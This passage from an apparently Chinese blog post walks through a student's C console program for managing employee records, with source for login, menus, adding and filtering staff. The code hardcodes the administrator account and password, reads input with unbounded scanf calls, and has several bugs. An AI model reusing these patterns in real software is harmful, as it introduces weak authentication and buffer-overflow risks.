pan><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>####&nbsp;&nbsp;&nbsp;3.1.3main.c</p><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include&quot;gongshi.h&quot;int main()&#123;    smile() ;    struct workers *workers;    workers &#x3D; (struct workers*)malloc(sizeof(struct workers));    int flag_1;    int n;    flag_1&#x3D;sign();    see();    if(flag_1&#x3D;&#x3D;2)    &#123;        system(&quot;cls&quot;);        Hollow();        while (1)        &#123;            scanf(&quot;%d&quot;,&amp;n);            if(n&#x3D;&#x3D;1)                f_1(workers);            else if(n&#x3D;&#x3D;2)                f_2(workers);            else if(n&#x3D;&#x3D;3)            &#123;                int n;                system(&quot;cls&quot;);                printf(&quot;请输入查询方式             1.   员工号查询         2.姓名查询\n&quot;);                scanf(&quot;%d&quot;,&amp;n);                if (n&#x3D;&#x3D;1)f_3_1(workers);                else if (n&#x3D;&#x3D;2)f_3_2(workers);            &#125;            else if(n&#x3D;&#x3D;4)                f_4(workers);            else if(n&#x3D;&#x3D;5)                f_5(workers);            else if(n&#x3D;&#x3D;6)            &#123;                f_6(n);                break;            &#125;            else            &#123;                int n;                system(&quot;cls&quot;);                printf(&quot;请输入正确的功能编号!\n&quot;);                system(&quot;pause&quot;);                system(&quot;cls&quot;);                Hollow();            &#125;        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-2分函数讲解"><a href="#3-2分函数讲解" class="headerlink" title="3.2分函数讲解"></a>3.2分函数讲解</h4><h6 id="3-2-1登录过场动画"><a href="#3-2-1登录过场动画" class="headerlink" title="3.2.1登录过场动画"></a>3.2.1登录过场动画</h6><pre class="line-numbers language-none"><code class="language-none">void smile()&#x2F;&#x2F;1、系统加载界面&#123;    int i;    printf(&quot;\n\n\n\n&quot;);    printf(&quot;\t\t\t\t\t系统加载中\n&quot;);    printf(&quot;\t\t\t&quot;);    for(i &#x3D; 0; i &lt;20; i++)    &#123;        printf(&quot;$ &quot;);        if(i &#x3D;&#x3D;19)            printf(&quot;\n&quot;);        Sleep(100);        &#x2F;&#x2F;使计算机进入短暂的休眠状态100毫秒    &#125;    system(&quot;cls&quot;);    printf(&quot;\n\n\n\n&quot;);    printf(&quot;\t\t\t\t\t系统加载完成！\n&quot;);    printf(&quot;\t\t\t\t\t  欢迎使用！\n&quot;);    Sleep(500);    system(&quot;cls&quot;);&#x2F;&#x2F;执行清屏操作&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;一个负责整活的过场动画，对于整个系统来说可有可无，但是可以丰富整个程序，避免这个程序过于简陋。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1 for循环和sleep（）函数搭配使用，每隔0.1秒输出一个$,做到登录动画；<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2 system(“cls”)函数清屏，输出系统加载完成，欢迎使用。</p><h6 id="3-2-2辅助文件读取函数（）"><a href="#3-2-2辅助文件读取函数（）" class="headerlink" title="3.2.2辅助文件读取函数（）"></a>3.2.2辅助文件读取函数（）</h6><pre class="line-numbers language-none"><code class="language-none">void see (void)&#x2F;&#x2F;该函数是从辅助文件中读取员工个数；&#123;    FILE *fp1;    char ch[10];    fp1&#x3D;fopen(&quot;data.txt&quot;,&quot;r+&quot;);    &#x2F;&#x2F;data.txt为辅助的文本文件；    if (fp1&#x3D;&#x3D;NULL)    &#123;        printf(&quot;人数预存文件打开失败&quot;);        exit(EXIT_FAILURE);    &#125;    fgets(ch,3,fp1);    NUM&#x3D;atoi(ch);    fclose(fp1);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1 我使用了名为<strong>data.txt</strong>的文本文件进行辅助，在运行这个文件时需要有一个函数读取文件中的数据。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2 使用fets（）函数以字符串的形式将数据从文本文件中读取出来，此时从文本文件中读取出来的是字符串，这里我们就用到一个atoi（）函数将字符串转化为整形数。</p><blockquote><p>其实这个地方用格式化读取<strong>fscanf（fp，“%d”，&amp;NUM）；</strong>完全可以做到，作者使用的方式完全多此一举，但考虑到实训要有和其他组不同的特色，故采取了这种下策，并不建议模仿。</p></blockquote><h6 id="3-2-3登录页面"><a href="#3-2-3登录页面" class="headerlink" title="3.2.3登录页面"></a>3.2.3登录页面</h6><pre class="line-numbers language-none"><code class="language-none">int sign(void)&#123;    int n;    struct workers *workers;    workers &#x3D; (struct workers*)malloc(sizeof(struct workers));    printf(&quot;\t\t\t&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n&quot;);    printf(&quot;\t\t\t||                  《职工信息管理系统》                   ||\n&quot;);    printf(&quot;\t\t\t||                                                         ||\n&quot;);    printf(&quot;\t\t\t||                 请按相应按键使用本系统！                ||\n&quot;);    printf(&quot;\t\t\t||                                                         ||\n&quot;);    printf(&quot;\t\t\t||                                                         ||\n&quot;);    printf(&quot;\t\t\t||   1.员工登录                       2.管理员模式         ||\n&quot;);    printf(&quot;\t\t\t||                                                         ||\n&quot;);    printf(&quot;\t\t\t&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n&quot;);    scanf(&quot;%d&quot;,&amp;n);    char number[9];    char pow[10];    if(n&#x3D;&#x3D;2)    &#123;        printf(&quot;请输入管理员账号&quot;);        scanf(&quot;%s&quot;,number);        fflush(stdin);        printf(&quot;请输入密码&quot;);        &#123;            for(int i&#x3D;0; i&lt;9; i++)            &#123;                pow[i] &#x3D; getch();                &#x2F;*逐次赋值,但不回显*&#x2F;                if (pow[i] &#x3D;&#x3D; &#39;\x0d&#39;)                    &#x2F;*回车则终止循环*&#x2F;                &#123;                    pow[i]&#x3D;&#39;\0&#39;;                    break;                &#125;                printf(&quot;*&quot;);       &#x2F;*以星号代替字符个数*&#x2F;            &#125;            fflush(stdin);            if((strcmp(number,&quot;0001&quot;)&#x3D;&#x3D;0) &amp;&amp; (strcmp(pow,&quot;123456&quot;)&#x3D;&#x3D;0))            &#123;                return n;            &#125;            else                printf(&quot;账号或密码错误!&quot;);        &#125;    &#125;    else if(n&#x3D;&#x3D;1)    &#123;        f_3 (workers);        return n;    &#125;    else    &#123;        int n;        system(&quot;cls&quot;);        printf(&quot;请输入正确的功能编号!\n&quot;);        system(&quot;pause&quot;);        system(&quot;cls&quot;);        sign();    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>此处是登录页面</strong><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1 回显实际上存在问题，如果在输入过程中输入错误，想要把已经输入的数据删除的话，是无法完成的，因为使用的是<strong>getchar（）</strong>，<em>delete</em>实际上也是一种字符，这里是一个隐患。由于影响并不严重，不会影响到我的演示，就没有对这个问题进行修复。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2 管理员账号设置后无法更改，这点有点反人类，做出更改实际不难，但是这次实训三人小组实际上就我一个人负责，我真的不想再给自己找活干了。</p><h6 id="3-2-4操作页面"><a href="#3-2-4操作页面" class="headerlink" title="3.2.4操作页面"></a>3.2.4操作页面</h6><pre class="line-numbers language-none"><code class="language-none">int Hollow(void)&#x2F;&#x2F;管理员页面，在程序中会反复调用；&#123;    system(&quot;cls&quot;);    printf(&quot;\n\n\n\t\t\t&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n&quot;);    printf(&quot;\t\t\t||                                                         ||\n&quot;);    printf(&quot;\t\t\t||                   《职工信息管理系统》                  ||\n&quot;);    printf(&quot;\t\t\t||                                                         ||\n&quot;);    printf(&quot;\t\t\t||                       管理员页面！                      ||\n&quot;);    printf(&quot;\t\t\t||                                                         ||\n&quot;);    printf(&quot;\t\t\t||                                                         ||\n&quot;);    printf(&quot;\t\t\t||                                                         ||\n&quot;);    printf(&quot;\t\t\t||                                                         ||\n&quot;);    printf(&quot;\t\t\t||   1.新建职工信息                 2.浏览职工信息         ||\n&quot;);    printf(&quot;\t\t\t||                                                         ||\n&quot;);    printf(&quot;\t\t\t||   3.查询职工信息                 4.删除职工信息         ||\n&quot;);    printf(&quot;\t\t\t||                                                         ||\n&quot;);    printf(&quot;\t\t\t||   5.变更职工信息                 6.退出程序             ||\n&quot;);    printf(&quot;\t\t\t||                                                         ||\n&quot;);    printf(&quot;\t\t\t&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n&quot;);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><center> 单纯的一个操作页面 </center>###### 3.2.5新建职工信息<pre class="line-numbers language-none"><code class="language-none">void f_1(struct workers *workers)&#x2F;&#x2F;以尾加法插入新的数据，并写入text.dat二进制文件中；&#123;    struct workers *p;    &#x2F;&#x2F;p是个指向结构体指针后面需要用到；    p &#x3D; (struct workers *)malloc(sizeof(struct workers));    &#x2F;&#x2F;对指针p分配大小；    p&#x3D;workers;    printf(&quot;请输入员工号:&quot;);    scanf(&quot;%s&quot;, p-&gt;jobNo);    printf(&quot;请输入姓名:&quot;);    scanf(&quot;%s&quot;, p-&gt;name);    printf(&quot;请输入性别:&quot;);    scanf(&quot;%s&quot;, p-&gt;sex);    printf(&quot;请输入所担任职务:&quot;);    scanf(&quot;%s&quot;, p-&gt;position);    printf(&quot;请输入年龄：&quot;);    scanf(&quot;%s&quot;,p-&gt;year);    printf(&quot;请输入工资:&quot;);    scanf(&quot;%s&quot;, p-&gt;salary);    printf(&quot;请输入家庭住址：&quot;);    scanf(&quot;%s&quot;, p-&gt;addr);    printf(&quot;请输入员工联系方式：&quot;);    scanf(&quot;%s&quot;, p-&gt;tel);    FILE *fp&#x3D;fopen(&quot;text.dat&quot;,&quot;ab+&quot;);    if (fp&#x3D;&#x3D;NULL)    &#123;        printf(&quot;文件打开失败&quot;);        exit(EXIT_FAILURE);        &#x2F;&#x2F;这段程序是结束函数块的，如果没有这段代码后面内容还会继续输出。    &#125;    fwrite(workers,sizeof(struct workers),1,fp);    &#x2F;&#x2F;将数据存入函数中；    fclose(fp);    char ch[10];    NUM++;    sprintf(ch,&quot;%d&quot;,&amp;NUM);    FILE *fp1;    fp1&#x3D;fopen(&quot;data.txt&quot;,&quot;w+&quot;);    itoa(NUM,ch, 10);    &#x2F;&#x2F;一个没学过的函数，把整形数转化成字符型；    fputs(ch,fp1);    fclose(fp1);    system(&quot;cls&quot;);    &#x2F;*    使用外部变量NUM，在使用者使用程序时先行为，NUM赋值；    *&#x2F;    Hollow();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>实现增添的一个程序块，主要功能**以追加的形式将数据存入二进制文件，并且将从文本文件中读取的NUM值自增，并将NUM重新存入文本文件中。**解释说明：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1 由于每个程序块没有返回值的需要，函数就使用了没有返回值的void类型&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2  **FILE** * **fp=fopen("text.dat","ab+");**以追加方式打开text.dat这个二进制文件 ，再使用**fwrite(workers,sizeof(struct workers),1,fp);**语句将一个大小为sizeof(struct workers)的结构体变量workers写入二进制文件中。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3 我在这里使用了itoa（）这个函数,函数原型为> char *itoa( int value, char *string,int radix)***value***：欲转换的数据。***string***：目标字符串的地址。***radix***： 转换后的进制数，可以是10进制、16进制等。同刚刚使用的atoi函数itoa函数也可以用格式化写函数fprintf（）解决，终究还是多此一举了。<h5 id="3-2-6浏览（筛选）职工信息："><a href="#3-2-6浏览（筛选）职工信息：" class="headerlink" title="3.2.6浏览（筛选）职工信息："></a>3.2.6浏览（筛选）职工信息：</h5><pre class="line-numbers language-none"><code class="language-none">void f_2(struct workers *workers)&#x2F;&#x2F;浏览已经写入的数据；&#123;    system(&quot;cls&quot;);    printf(&quot;\n\n\n\t\t\t&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n&quot;);    printf(&quot;\t\t\t||                                                         ||\n&quot;);    printf(&quot;\t\t\t||                                                         ||\n&quot;);    printf(&quot;\t\t\t||                                                         ||\n&quot;);    printf(&quot;\t\t\t||                                                         ||\n&quot;);    printf(&quot;\t\t\t||   1.浏览全部信息                 2.按性别方式筛选       ||\n&quot;);    printf(&quot;\t\t\t||                                                         ||\n&quot;);    printf(&quot;\t\t\t||   3.按年龄方式筛选               4.按薪资筛选           ||\n&quot;);    printf(&quot;\t\t\t||                                                         ||\n&quot;);    printf(&quot;\t\t\t||                                                         ||\n&quot;);    printf(&quot;\t\t\t&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n&quot;);    int n;    printf(&quot;请输入筛选的方式\n&quot;);    scanf(&quot;%d&quot;,&amp;n);    if(n&#x3D;&#x3D;1)    &#123;        system(&quot;cls&quot;);        struct workers read[100],*p;        FILE *fp&#x3D;fopen(&quot;text.dat&quot;,&quot;rb+&quot;);        if (fp&#x3D;&#x3D;NULL)        &#123;            printf(&quot;文件打开失败&quot;);            exit(EXIT_FAILURE);        &#125;        fread(read,sizeof(struct workers),100,fp);        int i;        for (i&#x3D;0; i&lt;NUM; i++)        &#123;            p&#x3D;&amp;read[i];            if(read[i].jobNo)            &#123;                printf(&quot;——————————————————————————————\n&quot;);                printf(&quot;|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n&quot;);                printf(&quot;|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n &quot;,p-&gt;jobNo, p-&gt;name, p-&gt;sex, p-&gt;year,p-&gt;position, p-&gt;salary, p-&gt;addr, p-&gt;tel);                printf(&quot;—————————————————————————————\n&quot;);            &#125;        &#125;        system(&quot;pause&quot;);        system(&quot;cls&quot;);        Hollow();    &#125;    else if(n&#x3D;&#x3D;2)    &#123;        int k;        system(&quot;cls&quot;);        printf(&quot;请输入要筛选的员工性别编号\n&quot;);        printf(&quot;1.男性    \t\t     2.女性\n&quot;);        scanf(&quot;%d&quot;,&amp;k);        struct workers read[100],*p;        FILE *fp&#x3D;fopen(&quot;text.dat&quot;,&quot;rb+&quot;);        if (fp&#x3D;&#x3D;NULL)        &#123;            printf(&quot;文件打开失败&quot;);            exit(EXIT_FAILURE);        &#125;        fread(read,sizeof(struct workers),100,fp);        if (k&#x3D;&#x3D;1)        &#123;            int i;            for (i&#x3D;0; i&lt;NUM; i++)            &#123;                p&#x3D;&amp;read[i];                if(strcmp(read[i].sex,&quot;男&quot;)&#x3D;&#x3D;0)                &#123;                    printf(&quot;——————————————————————————————\n&quot;);                    printf(&quot;|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n&quot;);                    printf(&quot;|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n &quot;,p-&gt;jobNo, p-&gt;name, p-&gt;sex, p-&gt;year,p-&gt;position, p-&gt;salary, p-&gt;addr, p-&gt;tel);                    printf(&quot;—————————————————————————————\n&quot;);                &#125;            &#125;            system(&quot;pause&quot;);            system(&quot;cls&quot;);            Hollow();        &#125;        else if (k&#x3D;&#x3D;2)        &#123;            int i;            for (i&#x3D;0; i&lt;NUM; i++)            &#123;                p&#x3D;&amp;read[i];                if(strcmp(read[i].sex,&quot;女&quot;)&#x3D;&#x3D;0)                &#123;                    printf(&quot;——————————————————————————————\n&quot;);                    printf(&quot;|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n&quot;);                    printf(&quot;|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n &quot;,p-&gt;jobNo, p-&gt;name, p-&gt;sex, p-&gt;year,p-&gt;position, p-&gt;salary, p-&gt;addr, p-&gt;tel);                    printf(&quot;—————————————————————————————\n&quot;);                &#125;            &#125;            system(&quot;pause&quot;);            system(&quot;cls&quot;);            Hollow();        &#125;        else        &#123;            printf(&quot;你好像想查询什么奇奇怪怪的东西！\n&quot;);            system(&quot;pause&quot;);            system(&quot;cls&quot;);            Hollow();        &#125;    &#125;    else if(n&#x3D;&#x3D;3)    &#123;        int k;        system(&quot;cls&quot;);        printf(&quot;请输入要筛选的员工薪资范围\n&quot;);        printf(&quot;1.青年    \t\t     2.壮年\n&quot;);        scanf(&quot;%d&quot;,&amp;k);        struct workers read[100],*p;        FILE *fp&#x3D;fopen(&quot;text.dat&quot;,&quot;rb+&quot;);        if (fp&#x3D;&#x3D;NULL)        &#123;            printf(&quot;文件打开失败&quot;);            exit(EXIT_FAILURE);        &#125;        fread(read,sizeof(struct workers),100,fp);        if (k&#x3D;&#x3D;1)        &#123;            int i;            for (i&#x3D;0; i&lt;NUM; i++)            &#123;                p&#x3D;&amp;read[i];                if(atoi(read[i].year)&lt;30)                &#123;                    printf(&quot;——————————————————————————————\n&quot;);                    printf(&quot;|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n&quot;);                    printf(&quot;|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n &quot;,p-&gt;jobNo, p-&gt;name, p-&gt;sex, p-&gt;year,p-&gt;position, p-&gt;salary, p-&gt;addr, p-&gt;tel);                    printf(&quot;—————————————————————————————\n&quot;);                &#125;            &#125;            system(&quot;pause&quot;);            system(&quot;cls&quot;);            Hollow();        &#125;        else if (k&#x3D;&#x3D;2)        &#123;            int i;            for (i&#x3D;0; i&lt;NUM; i++)            &#123;                p&#x3D;&amp;read[i];                if(atoi(read[i].year)&gt;30)                &#123;                    printf(&quot;——————————————————————————————\n&quot;);                    printf(&quot;|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n&quot;);                    printf(&quot;|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n &quot;,p-&gt;jobNo, p-&gt;name, p-&gt;sex, p-&gt;year,p-&gt;position, p-&gt;salary, p-&gt;addr, p-&gt;tel);                    printf(&quot;—————————————————————————————\n&quot;);                &#125;            &#125;            system(&quot;pause&quot;);            system(&quot;cls&quot;);            Hollow();        &#125;        else        &#123;            printf(&quot;你好像想查询什么奇奇怪怪的东西！\n&quot;);            system(&quot;pause&quot;);            system(&quot;cls&quot;);            Hollow();        &#125;    &#125;    else if(n&#x3D;&#x3D;4)    &#123;        int k;        system(&quot;cls&quot;);        printf(&quot;请输入要筛选的员工薪资范围\n&quot;);        printf(&quot;1.低薪    \t\t     2.中薪\t\t\t  3.高薪\n&quot;);        scanf(&quot;%d&quot;,&amp;k);        struct workers read[100],*p;        FILE *fp&#x3D;fopen(&quot;text.dat&quot;,&quot;rb+&quot;);        if (fp&#x3D;&#x3D;NULL)        &#123;            printf(&quot;文件打开失败&quot;);            exit(EXIT_FAILURE);        &#125;        fread(read,sizeof(struct workers),100,fp);        if (k&#x3D;&#x3D;1)        &#123;            int i;            for (i&#x3D;0; i&lt;NUM; i++)            &#123;                p&#x3D;&amp;read[i];                if(atoi(read[i].salary)&lt;3000)                &#123;                    printf(&quot;——————————————————————————————\n&quot;);                    printf(&quot;|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n&quot;);                    printf(&quot;|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n &quot;,p-&gt;jobNo, p-&gt;name, p-&gt;sex, p-&gt;year,p-&gt;position, p-&gt;salary, p-&gt;addr, p-&gt;tel);                    printf(&quot;—————————————————————————————\n&quot;);                &#125;            &#125;            system(&quot;pause&quot;);            system(&quot;cls&quot;);            Hollow();        &#125;        else if (k&#x3D;&#x3D;2)        &#123;            int i;            for (i&#x3D;0; i&lt;NUM; i++)            &#123;                p&#x3D;&amp;read[i];                if(atoi(read[i].salary)&gt;&#x3D;3000&amp;&amp;atoi(read[i].salary)&lt;8000)                &#123;                    printf(&quot;——————————————————————————————\n&quot;);                    printf(&quot;|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n&quot;);                    printf(&quot;|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n &quot;,p-&gt;jobNo, p-&gt;name, p-&gt;sex, p-&gt;year,p-&gt;position, p-&gt;salary, p-&gt;addr, p-&gt;tel);                    printf(&quot;—————————————————————————————\n&quot;);                &#125;            &#125;            system(&quot;pause&quot;);            system(&quot;cls&quot;);            Hollow();        &#125;        else if(k&#x3D;&#x3D;3)        &#123;            int i;            for (i&#x3D;0; i&lt;NUM; i++)            &#123;                p&#x3D;&amp;read[i];                if(atoi(read[i].salary)&gt;&#x3D;8000)                &#123;                    printf(&quot;——————————————————————————————\n&quot;);                    printf(&quot;|职工号|姓名  |性别|年龄|职务      |工资  |住址    |电话       |\n&quot;);                    printf(&quot;|%-6s|%-6s|%-4s|%-4s|%-10s|%-6s|%-8s|%-11s|\n &quot;,p-&gt;jobNo, p-&gt;name, p-&gt;sex, p-&gt;year,p-&gt;position, p-&gt;salary, p-&gt;addr, p-&gt;tel);                    printf(&quot;—————————————————————————————\n&quot;);                &#125;            &#125;            system(&quot;pause&quot;);            system(&quot;cls&quot;);            Hollow();        &#125;        else        &#123;            printf(&quot;你好像想查询什么奇奇怪怪的东西！\n&quot;);            system(&quot;pause&quot;);            system(&quot;cls&quot;);            Hollow();        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这一模块一开始计划是只是浏览全部的员工信息，在后期的实训过程中，想到一个公司经常会有各种活动，需要对参与员工进行筛选，对其追加了根据年龄，工资与性别的筛选功能。<br>解释说明：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1  浏览只需要将全部数据从二进制文件中读取到结构体，通过for循环将所有的数据输出到屏幕中。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2 